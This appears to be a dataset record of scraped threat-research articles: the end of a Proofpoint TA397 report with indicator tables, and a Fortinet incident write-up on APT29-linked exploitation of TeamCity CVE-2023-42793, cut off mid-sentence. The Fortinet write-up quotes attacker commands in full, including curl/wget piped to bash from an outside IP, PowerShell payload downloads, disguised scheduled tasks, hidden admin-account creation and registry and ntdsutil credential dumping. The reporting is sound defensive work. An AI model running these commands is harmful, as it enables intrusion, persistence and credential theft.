Campaign utizviewstation[.]com 2025-01-03 17:04:43 IST 2025-01-03 14:31:26 IST 2025-01-06 16:16:55 IST First seen in Campaign data: 2025-02-03, Staging URL: /sdf.php?fv=$env:COMPUTERNAME*$env:USERNAME ottawadesignlab[.]com 2024-08-25 16:23:26 IST 2024-08-23 12:23:49 IST 2024-09-27 12:32:13 IST Mentioned as C2 in https://www.ctfiot.com/211062.html Attribution Attribution of state-backed espionage activity has always been a challenge. However, by analyzing the confluence of multiple signals across various aspects of an actor\u2019s operations, we can make assessments as to the motives and origins of observed activity. TA397 is an espionage-focused threat actor that highly likely operates on behalf of an Indian intelligence organization. Based on our telemetry, TA397 primarily targets government and defense organizations in Asia and Europe, with a particular focus on entities with relations or interests in China, Pakistan, and other neighboring countries on the Indian subcontinent. Masquerading as foreign offices, embassies, and government entities of Madagascar, Mauritius and more, indicates that TA397 not only has knowledge of legitimate affairs of those countries, but leverages this knowledge to bolster the legitimacy of its spearphishing operations. Moreover, the use of legitimate or spoofed decoy documents, subject lines, and body contents pertaining to internal or foreign government affairs demonstrates that TA397 is very familiar with the standard practices of government. Having likely legitimate internal documents issued by the Bangladeshi military and tax authorities is highly consistent with the assessment that TA397 carries out intelligence-based tasking for Indian state interests. Our observations of hands-on-keyboard activity engagements showed TA397\u2019s responses beginning at 05:27 UTC following hours of dormant scheduled task beaconing in the first observed case, with follow up activity observed at 05:46 UTC and 08:57 UTC. In the second case, activity began at 10:40 UTC. Modifications on TA397\u2019s server were observed at 11:27 UTC with final follow up payload delivery at 13:37 UTC. This aligns with public assessments that TA397 is a threat actor of South Asian origin, if adjusted to Indian Standard Time or similar timezones. However, our analysis of TA397\u2019s sprawling infrastructure demonstrates the operational patterns the group follows. There is a clear indication that most infrastructure-related activity occurs during standard business hours in the IST timezone. As covered in part two of this blog series with Threatray, there is also overlap of tooling with other known Indian threat actors, Mysterious Elephant/APT-K-47 and Confucius through the use of ORPCBackdoor. This strongly suggests that TA397 is part of a tool sharing ecosystem among Indian state-backed actors. However, more research is needed to determine whether these groups operate with access to a central \u201cquartermaster\u201d \u2013 development resources that are either internal or external to the organizations they belong to. Indicators Indicator Type Description First Seen mnemautoregsvc[.]com Domain Staging domain October 2024 jacknwoods[.]com Domain Staging domain November 2024 1b67fc55fd050d011d6712ac17315112767cac8bbe059967b70147610933b6c1 SHA256 LNK scheduled task loader December 2024 7c5dde52845ecae6c80c70af2200d34ef0e1bc6cbf3ead1197695b91acd22a67 SHA256 CHM scheduled task loader December 2024 b56385dc93cc8f317ce499539b0d52aa0b3d8b6a8f9493e1ee7ba01765edd020 SHA256 LNK scheduled task loader December 2024 hxxp://46[.]229[.]55[.]63/svch.php?li=%computername%[.][.]%username% URL Payload delivery December 2024 hxxp://95[.]169[.]180[.]122/vbgf.php?mo=%computername%--%username% URL Payload delivery December 2024 inizdesignstudio[.]com Domain Staging domain December 2024 trkswqsservice[.]com Domain Staging domain January 2025 80b3a71138c34474725bbb177d8dec078effb7d8f4b19bf2e7a881b01ec7d323 SHA256 CHM scheduled task loader January 2025 55f75724386dbe740c0b868da913af2c8b280335da4fde64e2300c776b79d4e8 SHA256 CHM scheduled task loader February 2025 cdddbd65dbb24d3b9205e417cc267007bfd0369c316f70d2749887b9f02e949b SHA256 MSC scheduled task loader Februrary 2025 utizviewstation[.]com Domain Staging domain February 2025 1fbf95ccf1193e84d0e4f8c315816dd2aec56edb11ef1e7b28667360ca7e5ccd SHA256 CHM scheduled task loader March 2025 55f75724386dbe740c0b868da913af2c8b280335da4fde64e2300c776b79d4e8 SHA256 CHM scheduled task loader March 2025 5a39f10d2e4c1cae1b52baff0cf8b3e397da2e69cb90e1bac138e8d437cbea41 SHA256 IQY scheduled task loader March 2025 blucollinsoutien[.]com Domain Staging domain March 2025 princecleanit[.]com Domain Staging domain March 2025 woodstocktutors[.]com Domain Staging domain April 2025 warsanservices[.]com Domain Staging domain April 2025 headntale[.]com Domain Staging domain April 2025 cc65fac9151fa527bc4b296f699475554ee2510572b8c16d5ef4b472a4cb9ffc SHA256 Microsoft Access Database scheduled task loader April 2025 680c99915d478ed8d9f1427b3deb2ebd255a6ec614ad643909ab4c01f52905ae SHA256 CHM scheduled task loader April 2025 c9612051b3956ac8722d8be7994634b7c940be07ca26e2fc8d0d5c94db2e4682 SHA256 CHM scheduled task loader May 2025 Previous Blog Post Next Blog Post Subscribe to the Proofpoint Blog Turn people into your best defense with Proofpoint Get in Touch Products Collaboration Security Data Security and Governance Partners Channel Partners and Distributors MSP Partners Technology and Alliance Partners Get Support Product Support Login Support Services IP Address Blocked? More About Proofpoint Why Proofpoint Careers Leadership Team News Center AI, Privacy and Trust Hornetsecurity Connect with Us +1 408 517 4710 Attend an Event Contact Us Free Demo Request \u00a9 2026. All rights reserved. Terms and conditions Privacy Policy Sitemap",
    "expected_count": 13
  },
  {
    "url": "https://www.fortinet.com/blog/threat-research/teamcity-intrusion-saga-apt29-suspected-exploiting-cve-2023-42793",
    "title": "TeamCity Intrusion Saga: APT29 Suspected Among the Attackers Exploiting CVE-2023-42793 | FortiGuard Labs",
    "content": "TeamCity Intrusion Saga: APT29 Suspected Among the Attackers Exploiting CVE-2023-42793 | FortiGuard Labs Blog Products & Solutions Secure Networking Unified SASE Cloud Security Security Operations Operational Technology Security Architecture Threat Research Threat Research PSIRT Thought Leadership CISO Collective Industry Trends Corporate Fortinet News & Updates Partners Customer Success Stories Life at Fortinet FortiGuard Labs Threat Research TeamCity Intrusion Saga: APT29 Suspected Among the Attackers Exploiting CVE-2023-42793 By Amey Gat, Mark Robson, John Simmons, Ken Evans, Jared Betts, Angelo Cris Deveraturda, Hongkei Chan and Jayesh Zala | December 13, 2023 Article Contents By Amey Gat, Mark Robson, John Simmons, Ken Evans, Jared Betts, Angelo Cris Deveraturda, Hongkei Chan and Jayesh Zala | December 13, 2023 Affected Platforms: Machines running vulnerable JetBrains TeamCity versions (before 2023.05.4, per vendor advice) Threat Type: Remote Code Execution Vulnerability Impact: Remote code execution for unauthenticated users, enabling initial access to vulnerable servers Security Level : High Cyber Kill Chain\u00ae Introduction On September 6, 2023, researchers from Sonar discovered a critical TeamCity On-Premises vulnerability (CVE-2023-42793 [1] ) issue. [2] TeamCity is a build management and continuous integration server from JetBrains [3] . On September 27, 2023, a public exploit for this vulnerability was released by Rapid7 [4] . This critical vulnerability was given a CVE score of 9.8, most likely because an attacker can deploy the publicly available exploit without authentication supporting remote code execution on the victim server using a basic web request to any accessible web server hosting the vulnerable application. This vulnerability has been observed being actively exploited in the wild and was added to CISA's 'Known Exploited Vulnerabilities Catalog' on October 4, 2023. [5] In mid-October 2023, the FortiGuard Incident Response (IR) team sent a courtesy notification to an organization that had been compromised due to this vulnerability. This organization engaged the FortiGuard IR team to investigate the malicious activity in their network. The victim was a US-based organization in the biomedical manufacturing industry. Our subsequent investigation determined that initial access for the attack was through the exploitation of the CVE-2023-42793 TeamCity vulnerability using a custom-built exploit script written in Python. The behavior of the malware used in post-exploitation matches the GraphicalProton malware used by APT29. This article breaks down our investigation and the outcome of our containment, eradication, and remediation efforts. As part of this analysis, we look at threat actor TTPs employed throughout the intrusion and how they were identified and pieced together by the FortiGuard IR team. MITRE ATT&CK mapping and observables are provided at the end of the article, alongside IOCs and FortiEDR Threat Hunting queries, to assist with threat-hunting activities for similar behavior. Summary of Attack Figure 1: The attack timeline of TeamCity intrusion described in this article. Analysis Vulnerability Exploitation As part of our initial customer engagement, we examined several EDR events reported from one of the victim's Windows application servers (HOST_1_TEAMCITY). During a scoping call, the FortiGuard IR team identified that one of the applications hosted on this server was TeamCity. The victim had only recently updated the application to a non-vulnerable version. We began by retrieving application and system logs from the suspected compromised server (HOST_1_TEAMCITY). On analysis of the application logs, we identified significant evidence of successful exploitation of the TeamCity vulnerability. The authentication bypass can be observed in the screenshot of the teamcity-auth.log file, shown in Figure 2. Figure 2: A snippet of the 'teamcity-auth.log' screenshot highlighting the TeamCity exploit evidence and associated remote IP. Analysis of these logs showed that this vulnerability had been exploited multiple times over a relatively short period, with connections originating from multiple unique public IP addresses. The teamcity-auth.log (authentication events log) identifies successful exploitation but does not provide details on commands executed through exploitation. This information is available in the separate 'teamcity-server.log' file, a general server log for the TeamCity software. Analyzing this log file around confirmed attempted remote code execution on the same host. For example, the IP address 167[.]179[.]75[.]213 taken from the highlighted log entry in Figure 2 was correlated with the echo command execution log highlighted in the 'teamcity-server.log' entry in Figure 3. Details of the external command execution from the 'teamcity-server.log file can also be seen in Figure 3. Figure 3: A snippet of the 'teamcity-server.log' showing remote code execution evidence, including the associated command executed through the exploitation. Further analysis of the various commands executed on the vulnerable server through this RCE exploit led the IR team to believe multiple threat actors were conducting simultaneous operations. Some commands executed as part of this intrusion are shown in Table 1. Remote IP Address Commands Executed 167[.]179[.]75[.]213 Command line: whoami 154[.]26[.]133[.]111 Command line: bash -c \"nproc 2>&1\" 104[.]207[.]152[.]236 Command line: cmd.exe \"/c whoami\" 104[.]207[.]152[.]236 Command line: cmd.exe \"/c ipconfig /all\" 104[.]207[.]152[.]236 Command line: cmd.exe \"/c ipconfig /displaydns\" 104[.]207[.]152[.]236 Command line: cmd.exe \"/c hostname\" 74[.]207[.]242[.]113 Command line: cmd.exe \"/c tasklist /svc\" 74[.]207[.]242[.]113 Command line: cmd.exe \"/c netstat -ano\" 74[.]207[.]242[.]113 Command line: cmd.exe \"/c net user /domain\" 212[.]113[.]106[.]100 Command line: uname -a 212[.]113[.]106[.]100 Command line: cmd.exe /c whoami 212[.]113[.]106[.]100 Command line: cmd.exe /c systeminfo 212[.]113[.]106[.]100 Command line: cmd.exe /c net user 212[.]113[.]106[.]100 Command line: cmd.exe /c \"echo 167043640 > C:/Windows/Temp/0\" 43[.]248[.]34[.]77 Command line: echo 2W1EVQsV5piPbyW6FSsNC8D7irR 103[.]89[.]13[.]155 Command line: echo 2W28BTpkdCjcRPQNkSF5qFCphlG 195[.]246[.]120[.]4 Command line: echo 2W28BTpkdCjcRPQNkSF5qFCphlG 20[.]222[.]6[.]225 Command line: echo 2W2GZqAg8k6ipgBTcHyK5wABDSW 45[.]133[.]7[.]129 Command line: cmd.exe /c echo 9fW99pdqfpXU21zd 45[.]133[.]7[.]154 Command line: cmd.exe \"/c net user <redacted> \"<password redacted>\" /add\" 45[.]133[.]7[.]154 Command line: cmd.exe \"/c echo <redacted> | c:\\TeamCity\\bin\\anydesk.exe --set-password\" 45[.]133[.]7[.]156 Command line: wget --no-check-certificate https[:]//fisheries-states-codes-camps.trycloudflare[.]com/rcu 45[.]133[.]7[.]124 Command line: /bin/sh -c \"(curl -s 194.38.22[.]53/tc.sh||wget -q -O- 194.38.22[.]53/tc.sh)|bash\" Table 1. Commands executed by multiple threat actors on the TeamCity software host HOST_1_TEAMCITY. Looking critically at some of the attempted commands, it appears that some of the threat actors successfully exploited the vulnerability but were unsuccessful at running Linux system commands on the victim Windows Server. An example of this behavior can be seen in Figure 4. Figure 4: TeamCity log showing attempted Linux command execution by a threat actor following successful vulnerability exploitation. It appears that several of the commands from various remote IPs may have been associated with the use of the open-source vulnerability scanner Nuclei [6] . The IR team found a Nuclei template (CVE-2023-42793.yaml) designed to identify the presence of the TeamCity vulnerability in Nuclei's official template repository [7] . The yaml template file contains the following line: POST /app/rest/debug/processes?exePath=echo&params={{randstr}} HTTP/1.1 The resulting request would produce an echo command on a successfully exploited TeamCity server, identical to the echo commands observed in the victims' TeamCity logs. The IR team collated information from both logs to better understand the correlations between when the echo commands were executed and the associated network connections from the numerous public IP addresses. A snippet of this correlation is shown in Figure 5, where the echo commands generated by some of the Nuclei scanning are also highlighted. Figure 5: A snippet of correlated logs showing network connections and subsequent commands. Highlighted are multiple echo commands indicative of likely Nuclei scanning. At this stage of the intrusion, it became clear that multiple threat actors were scanning for the vulnerability, validating if it could be exploited, and attempting to establish a foothold using the related exploitation. The following section of this report focuses on the activities of one of these threat actors distinct from other threat actor activities. We will refer to this culprit as the 'main threat actor.' A description of the activities conducted by other threat actors exploiting this vulnerability is covered more extensively in the following 'Other Threat Actors Activity' section. Main Threat Actor Intrusion The first activity attributed to the main threat actor was the execution of an echo command like those discussed above, indicating that the main threat actor likely employed Nuclei to identify potential victims. After this initial command, the main threat actor began executing additional discovery commands to gather system and privilege information. Some of these discovery commands are shown below: cmd.exe \"/c systeminfo\" whoami ipconfig /all whoami /all The command attributed to the Nuclei scanning, as well as these subsequent discovery commands, were linked to different remote IP addresses. However, we assessed them as being from the same actor due to the slight timeline difference of a few seconds between the activities. This indicates the main threat actor uses different infrastructures to scan for victims and execute later commands. One command and control (C2) IP address discovered during our investigation was linked to a US-based tertiary education organization. Upon detection of this active exploitation, the FortiGuard IR team notified the organization that their infrastructure may have been compromised and part of an ongoing APT29 campaign. They performed an internal investigation and identified exploitation of their vulnerable TeamCity server associated with the previously identified IP address. As part of this exploitation, the main threat actor used the TeamCity exploit to install an SSH certificate, which they then used to maintain access in this second victim's environment. The organization's security team provided additional information to the FortiGuard IR team, who then identified that the source of the attack on the educational organization was a TOR exit node. This report does not include the victim\u2019s details used as a relay to protect their identity. They have successfully remediated their environment and patched the associated vulnerability. After executing the discovery commands outlined above, the main threat actor attempted to download a DLL file, 'AclNumsInvertHost.dll,' on the TeamCity host using PowerShell and the 'Invoke-WebRequest' cmdlet. The actor used the following command to download the file: powershell -exec bypass -c \"Invoke-WebRequest -Uri hxxp[:]//103[.]76[.]128[.]34:8080/AclNumsInvertHost.dll -OutFile C:\\Windows\\System32\\AclNumsInvertHost.dll\" After successfully downloading this DLL file on the HOST_1_TEAMCITY, the main threat actor again used the TeamCity RCE vulnerability to create a Windows-scheduled task referencing this DLL file. They likely did this for persistence and to abstract their execution from the TeamCity exploitation. The actor used the following command to create the scheduled task: schtasks.exe /create /SC ONLOGON /tn \"\\Microsoft\\Windows\\DefenderUPDService\" /tr \"\\\"C:\\Windows\\system32\\rundll32.exe\\\" \\\"C:\\Windows\\system32\\AclNumsInvertHost.dll\\\",AclNumsInvertHost\" We recovered the associated Windows task file from the victim TeamCity server (HOST_1_TEAMCITY), confirming that the command in the TeamCity log had been successfully executed and the scheduled task was created. The retrieved Windows task data is shown in Figure 6: Figure 6: Windows task created by threat actor for the persistence of a DLL file. After successfully creating the scheduled task, the actor attempted to execute the newly created task using the following command, again executed through the TeamCity RCE vulnerability on the HOST_1_TEAMCITY: schtasks.exe /run /tn \"\\Microsoft\\Windows\\DefenderUPDService\" Analyzing the scheduled task and its method of creation, we noticed two main indicators of interest: the URL 'hxxp[:]//103[.]76[.]128[.]34:8080/AclNumsInvertHost.dll' and the file 'AclNumsInvertHost.dll.' We then analyzed the URL referenced for downloading this payload. At the time of the incident, there was limited open-source information on the IP contained in the URL or associated URLs. However, the certificate used on the webserver hosted at this IP was of interest. The certificate is expired with the common name '*.ultasrv[.]com'. This common name does not appear to be associated with a legitimate organization [8] . The entity associated with ultasrv[.]com seems to be a VPS (Virtual Private Server) provider. Looking more closely at the webserver itself, we identified that it had an accessible open directory service. We then used this access to identify additional payloads hosted by the associated threat actor. The files on the server can be seen in Figure 7. Figure 7: Files from the opendir listing of the C2 server used by the threat actor associated with TeamCity exploitation. Some information on the hosted files is provided in Table 2, along with associated file hashes. Sr. No. Filename Description SHA1 Hash 1 a.zip Contains the rr.exe file e3a34930e5a814db0b5d0ac7c313cfb1c294b39e 2 AclNumInvertHost.dll Malicious DLL d4411f70e0dcc2f88d74ae7251d51c6676075f6f 3 ehttpserver.py Python HTTP server source code 5d3b03d7e74e7c378b25f53d1fc3605776edbcaf 4 iis.zip Contains iisexpresstray.exe, mscoree.dll, mscorees.dll abc50465a4b4108765a6cd6006c772fabd048458 5 iisexpresstray.exe Legitimate executable from Microsoft that is part of IISExpress setup/installer c7f2137331105686aa4eb39bcfe1bae23fa19956 6 jaspic-providers.xml Apache Tomcat configuration file ed6c18c49a8bde1170c97698aeb1b85292a1967d 7 mscoree.dll Legitimate DLL file from Microsoft ada02e4442daa69427a2815a8819f3a1285ad772 8 mscorees.dll Malicious DLL 2df317b8a408d2ad5c94b9de6f20bbef03e46066 9 omzu5a.ar Unknown file detected as data file 38860565592ce018b415ecd72bc2fb1a0742702c 10 pdhui_1.dll Malicious DLL 5ce062f210e1a5026cb53e9949865312ee477e3c 11 poc.py PoC python code used by the actor to exploit TeamCity vulnerability CVE-2023-42793 bcbadf744954660f9a46324649eda6a14d724cbc 12 rr.exe Unknown executable 18192bb4aaa1b72104be4d26460b55f31ca65baf 13 server.py Python HTTP server code b2829fd893f26cb513018c4e03428f1ef5915da0 14 sudoers Linux sudoer config file d3a19eb3db9f7fe8d984e124da95a4c1cafa332e 15 winmms.dll Malicious DLL 3a32e516c037c37f7bf83171e167511ba53870a7 16 winmm.dll Legitimate DLL file from Microsoft d5cc1f2549fa138a931ad43d5d81d3a367c0de6e 17 zabbix.zip Contains pdhui_1.dll (a malicious DLL) and other legitimate Zabbix (opensource monitoring software) files 281bb0dadc789b89f7ae30d5f4bdeae57c66b0e1 Table 2. Descriptions of files found on the C2 server 103.76.128[.]34. Analysis of the code in the poc.py file identified the script as a custom Python implementation of an exploit for the TeamCity vulnerability CVE-2023-42793. You can see the request URL found in the log and the Python code used to generate the request in Figure 8. Figure 8: A snippet of code from poc.py found on the C2 web server, and a snippet of the TeamCity log showing a similar request received by the victim during exploitation. Comparing the structure of a request sent using this script and the commands executed from the victim logs, it is almost certain that this script was used to deliver the exploit to the victim TeamCity server (HOST_1_TEAMCITY ). This links the IP extracted from the scheduled task (103[.]76[.]128[.]34) to the source of the exploitation from the logs shown in Figure 9 (45[.]138[.]16[.]63). Using the FortiGuard Central Threat System (CTS), we could also see that the IP address associated with the exploitation has been linked to other significant malicious activity. Of the 171 domains associated with this IP, 92 have been tagged with high confidence as malicious, and 78 have been tagged with high confidence as suspicious. Only one of the domains has been tagged as low risk (Figure 9). Figure 9: FortiGuard CTS information on the IP associated with the main threat actor TeamCity exploitation in the victim environment. The other element of interest in the scheduled task created by the main threat actor was the DLL file, 'AclNumsInvertHost.dll.' Our analysis identified that the DLL AclNumsInvertHost.dll has ten file sections. The most notable was '.fy55f5', which is a user-modified section. This section has an MZ header (indicating it is a Windows portable executable), but the remainder of the code has a high entropy of 7.99, which is typically indicative of encryption. The '.fy55f5' section can be seen in Figure 10. Figure 10: Encrypted code section of the AclNumsInvertHost.dll executed as part of the main threat actor's scheduled task persistence. The IR team believes that this '.fy55f5' section of the DLL contains the final payload, which is decrypted at runtime. There are a number of anti-debug techniques implemented within the DLL file code that inhibited dynamic analysis during the engagement. To understand the DLL functionality more quickly, we performed comprehensive Yara scanning of all the files pulled from the threat actors' webserver. The AclNumsInvertHost.dll library and multiple other DLL files matched on a Yara rule for a known malware family called 'GraphicalProton.' The positive Yara rule match was developed by Insikt Group from Recorded Future and is based on a specific API calling method employed by previously observed GraphicalProton samples. A match for this rule is a high-confidence indicator of GraphicalProton. The results of the matching Yara scan are shown in Figure 11. Figure 11: Yara rule for GraphicalProton matched against multiple DLL files found on the main threat actor opendir server. The files in Figure 11 also matched the Yara rule M_Dropper_BURNTBATTER_1, which searches for the custom chaskey implementation. This Yara rule was from the article, 'Backchannel Diplomacy: APT29's Rapidly Evolving Diplomatic Phishing Operations,' by Mandiant [9] . GraphicalProton is a malware historically employed by group APT29. While this tooling is confidently linked to APT29 (Mandiant) or BlueBravo (Recorded Future), the victimology and initial access vector employed by the main threat actor throughout earlier stages of this intrusion does not align with currently reported APT29 campaigns. However, a previous well-known attack from APT29 targeted the company Solarwinds, using the same build of the TeamCity management tool [10] . While the IR team could not attribute this activity to APT29 with high confidence, associated threat intelligence was used to focus our investigation further. [11] At this stage of the intrusion, FortiEDR detected and blocked this scheduled task from executing due to its suspicious use of rundll32.exe and a machine learning assessment of the previously unobserved DLL 'AclNumsInvertHost.dll.' This forced the main threat actor to attempt alternative methods of execution. The first alternative method was to use the TeamCity exploit on HOST_1_TEAMCITY to download the 'iisexpresstray.exe' and 'mscoree.dll' files from the same C2 through PowerShell. These two files were written to the directory' C:\\Windows\\WinStore\\'. The 'iisexpress.exe' file is a legitimate signed installer executable for IISExpress, a lightweight implementation of IIS provided by Microsoft [12] . However, downloaded alongside this legitimate installer was 'mscoree.dll,' a malicious DLL file with the same name as a legitimate DLL (T1036.005). [13] The combination of these two files would allow the threat actor to employ DLL search order hijacking (T1574.001) [14] to execute their malicious DLL when the legitimate IISExpress executable is executed. To execute this side-loading attack, the main threat actor created another scheduled task using the following command executed via the TeamCity exploit: schtasks.exe /create /SC ONSTART /tn \"\\Microsoft\\Windows\\IISUpdateService\" /tr \"C:\\Windows\\WinStore\\iisexpresstray.exe\" /RU \"SYSTEM\" /f After the scheduled task was created, the threat actor executed the scheduled task using the following command: schtasks.exe /run /tn \"\\Microsoft\\Windows\\IISUpdateService\" When the 'iisexpresstray.exe' file was executed on the HOST_1_TEAMCITY, a separate thread was created by the malicious DLL file that tried to access the system credentials through lsass.exe. This attempt was also blocked by FortiEDR. This is shown in the event graph in Figure 12. Figure 12: FortiEDR blocked access to lsass.exe from iisexpresstray.exe. The main threat actor had used multiple legitimate software in this attack. The list of legitimate files is shown in the table below. Some of the executables listed in Table 3 were recovered from the opendir [15] web server. Sr. No. File Name Description 1 iisexpresstray.exe Legitimate IIS Express exe used for the execution of malicious DLL mscorees.dll 2 MpCmdRun.exe Legitimate Defender command line utility used for execution of malicious DLL MpCmdHelp.dll 3 FlashUtil_ActiveX.exe Legitimate Flash exe used for the execution of malicious DLL oleac.dll 4 zabbix_agentd.exe Legitimate executable to Zabbix software used to load the malicious DLL pdhui_1.dll Table 3. List of legitimate software executables observed in the attack and on the C2 server, which are used to load malicious DLL files. Since FortiEDR blocked the execution of this second malicious DLL file, the main threat actor changed their approach and attempted to dump the registry using Windows utility reg.exe directly through further TeamCity exploitation. Unfortunately for the main threat actor, FortiEDR blocked this execution due to the triggered rules 'Access to Critical System Information' and 'Connection Attempt from a Hidden Process' under its 'Exfiltration Prevention' security policy. A screenshot of the related FortiEDR event is shown in Figure 13. Figure 13: Attempt to dump system credentials using reg.exe was blocked by FortiEDR. These attempts represent only two of the many credential dumping techniques the threat actor attempted to employ within the victim environment. Fortunately, the FortiEDR software installed on the majority of their endpoints, including the victim server, blocked these techniques. The associated EDR security events also generated multiple alerts. Unfortunately, the targeted organization made numerous broad exceptions for this malicious behavior. This was likely due to the behavior originating from the TeamCity application, so they were incorrectly assessed as a false positive. These exceptions are outlined below: allow rundll32.exe to run AclNumsInverHost.dll when rundll32.exe is executed by cmd.exe. allow reg.exe to run as a hidden process allow reg.exe to access critical system information (credential dumping) allow natid.sys to be loaded (a suspicious driver dropped by the threat actor) allow rundll32.exe to execute AclNumsInvertHost.dll and create a thread in any lsass.exe process allow rundll32.exe to execute AclNumsInvertHost.dll and create a thread in any svchost.exe process allow any execution of PowerShell and associated rule violations These exceptions removed the constraints around the adversary's ability to fully employ their TeamCity exploitation, allowing the main threat actor to continue their execution unrestricted by FortiEDR. After these exceptions were set, the main threat actor was able to successfully dump the registry of the Windows host HOST_1_TEAMCITY to gain access to local user credentials (T1003.002) [16] . To achieve this, the threat actor used reg.exe to dump the SYSTEM registry hive (T1003.002 [17] ) using the command below: reg.exe save HKLM\\SYSTEM \u201cC:\\Windows\\temp\\1\\sy.sa\u201d /y This can be seen in the FortiEDR Threat Hunting event shown in Figure 14. Figure 14: FortiEDR Threat Hunting event associated with the reg.exe process being used to dump the SYSTEM registry hive. At this stage, the main threat actor continued to employ their TeamCity exploit for execution, trying alternative techniques to establish a more robust foothold on the HOST_1_TEAMCITY. They used their access to create a Windows account, 'oldadministrator' (T1136.001 [18] ), added the newly created account to the local administrators group, and made the account a special account by adding it to the registry path 'NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\Userlist' with the DWORD value 0. When a Windows user account is added to this registry location with value 0, the account is not shown on the Windows GUI login screen. This was likely done to hide their new access and ensure persistence from direct observation by normal system users. However, the IR team did not observe that the main actor ever used this newly created 'oldadministrator' account. Log events associated with these activities can be observed in the teamcity-server.log snippet shown in Figure 15. Figure 15: Extract from the TeamCity application logs showing the commands used to create a new local Windows user on the victim endpoint. At this time, the host HOST_1_TEAMCITY was patched for CVE-2023-42793. The IR team verified the patch was successful and that there was no further exploitation of this vulnerability on this host following the installation of the patch. Unfortunately, the threat actor had already created alternative access through their GraphicalProton implant and had already begun laterally moving to other hosts within the victim network through SMB, RDP, and remote WMIC commands. The hosts HOST_3_SVR and HOST_4_SVR were targeted using WMIC commands (T1047) [19] from the original compromised host, HOST_1_TEAMCITY. The network connections linked to this behavior were established using explicit credentials. This indicates that the main threat actor had successfully pulled credentials prior to this activity. The IR team thinks this WMIC activity was likely conducted to execute a GraphicalProton DLL through either rundll32 proxy execution like that demonstrated in the previously discussed scheduled task or through search order hijacking using one of the binary and DLL pairs pulled from the main threat actor C2 opendir web server. You can see evidence of the network connection associated with this WMIC activity from the Windows event log in Figure 16. Figure 16: Windows log screenshot showing WMIC.exe execution remotely from HOST_1_TEAMCITY to HOST_4_SVR On the HOST_2_SVR, the main threat actor employed a different lateral movement technique by establishing an RDP connection from the HOST_1_TEAMCITY. This connection was used to create multiple suspicious files in the 'C:\\Windows\\SchCache\u2019 directory on HOST_2_SVR. Two DLL files (\u2018oleacc.dll\u2019 and \u2018oleac.dll\u2019) and one executable file (\u2018FlashUtil_ActiveX.exe\u2019) were created in this directory. When the IR team ran a Yara scan against these files, the DLL file oleac.dll matched the Yara rule for GraphicalProton. The remaining files, oleacc.dll and FlashUtil_ActiveX.exe, were determined to be non-malicious Microsoft-signed files. The main threat actor then created persistence for this file through a scheduled task. This time, the task was named 'WindowsActiveX' and was created to execute the 'C:\\Windows\\SchCache\\FlashUtil_ActiveX.exe' file when Windows starts. This shows the use of another legitimate executable to perform search order hijacking to load a malicious GraphicalProton DLL. The command used to create this scheduled task can be observed in the FortiEDR Threat Hunting event, shown in Figure 17. Figure 17: FortiEDR Threat Hunting event showing the creation of a scheduled task for FlashUtil_ActiveX.exe In another credential dumping attempt, the main threat actor tried to dump active directory credentials using the Windows utility \u2018ntdsutil.exe\u2019 on the host HOST_2_SVR. They tried to dump credentials using the following command: ntdsutil.exe 'ac i ntds' 'ifm' 'create full C:\\tempp' q q This command aims to dump the ntds.dit file, the SYSTEM registry hive, and the SECURITY registry hives in the given path (in this case, \u2018C:\\tempp\u2019). Threat actors can often dump password hashes from these files offline using tools like mimikatz. [20] FortiEDR blocked this activity, and the associated security event can be observed in Figure 18. Figure 18: Execution of ntdsutil.exe to dump ntds.dit file was blocked by FortiEDR. In addition to this scheduled task, the IR team found another GraphicalProton DLL in the \u2018C:\\Program Files\\Windows Defender\u2019 directory. This directory contained an executable PE file, \u2018MpCmdRun.exe,\u2019 and DLL files, \u2018MpCmdHelp.dll\u2019 and \u2018MpClient.dll.\u2019 One of the files (MpCmdHelp.dll) matched against the Yara rule for malware GraphicalProton, and the second DLL file, MpClient.dll, is a legitimate library used by \u2018MpCmdRun.exe.\u2019 Like the \u2018FlashUtil_ActiveX.exe\u2019 example discussed earlier in this report, the \u2018MpCmdRun.exe\u2019 is a legitimate binary vulnerable to search order hijacking. The \u2018MpCmdRun.exe\u2019 binary is an official command-line tool used to perform various operations related to Microsoft Defender Antivirus. The default path of this binary is \u2018C:\\Program Files\\Windows Defender.\u2019 At this investigation stage, the team performed large-scale Yara scanning to identify additional potentially compromised hosts. This scanning identified DLL files matching the GraphicalProton signature written to disk on the hosts HOST_6_SQL and HOST_7_SVR. On both hosts, a task named \u2018WindowsDefenderService\u2019 that executed the GraphicalProton DLLs was created, matching the tradecraft of the previously discussed scheduled tasks. One of the scheduled task files associated with these tasks can be seen in Figure 19. Figure 19: Schedule task file for proxy execution of the malicious GraphicalProton DLL file identified on HOST_6_SQL. The IR team also found a network login to HOST_5_SVR from the primary infected HOST_1_TEAMCITY host. Shortly after this login event, an instance of rundll32 used for proxy execution of another GraphicalProton sample was started. However, the process crashed. This resulted in a memory dump of the rundll32.exe process. The IR team performed strings analysis of the memory dump and found URLs of graph.microsoft[.]com and 1drv[.]ms, which are legitimate domains related to Microsoft OneDrive operations. The IR team also found an email address (quentparoty[@]outlook.com) in the memory dump, although this indicator has not been linked to any known IOCs. However, it has been included for completeness. Significant strings extracted from the memory dump can be seen in Figure 20. Figure 20: Strings from memory analysis of crash dump showing email address and URL of OneDrive. Similar network indicators were identified when we executed the AclNumsInvertHost.dll file using rundll32.exe in a virtual analysis environment. The IR team also observed connections to api.dropboxapi[.]com from the rundll32.exe in the Threat Hunting data of the victim environment. The GraphicalProton report [21] from Insikt Group from Recorded Future showed that researchers had previously observed GraphicalProton samples employ Microsoft OneDrive and Dropbox as part of their C2. The malicious DLL samples were shared with analysts from the FortiGuard Forensics Team for further malware analysis. They confirmed that the behavior of the multiple malicious DLL matches GraphicalProton malware behavior. The malicious DLL was communicating with Microsoft OneDrive, and the following information was obtained in JSON format from this communication. Key Value @odata.context https://graph[.]microsoft[.]com/v1.0/$metadata#users('quentparoty%40outlook[.]com')/drive/root/$entit name blatant webUrl https://1drv[.]ms/f/s!AGVbcHFCdi2qmmw displayName quent-application driveId aa2d764271705b65 driveType personal id AA2D764271705B65!106 folder name quent-application path /drive/root:/Apps/quent-application Key Value @odata.context https://graph[.]microsoft[.]com/v1.0/$metadata#users('girmisdrong%40outlook.com')/drive/root/$entity name excerpt2002VI webUrl https://1drv[.]ms/f/s!AALb1YPGQLqThmw displayName GrimiApplication driveId 93ba40c683d5db02 driveType personal id 93BA40C683D5DB02!103 folder name GrimiApplication path /drive/root:/Apps/GrimiApplication The analyst team also observed numerous anti-debugging techniques in malicious DLL files, such as a call to NtQueryObject to look for the \u201cDebugObject\u201d variable. It 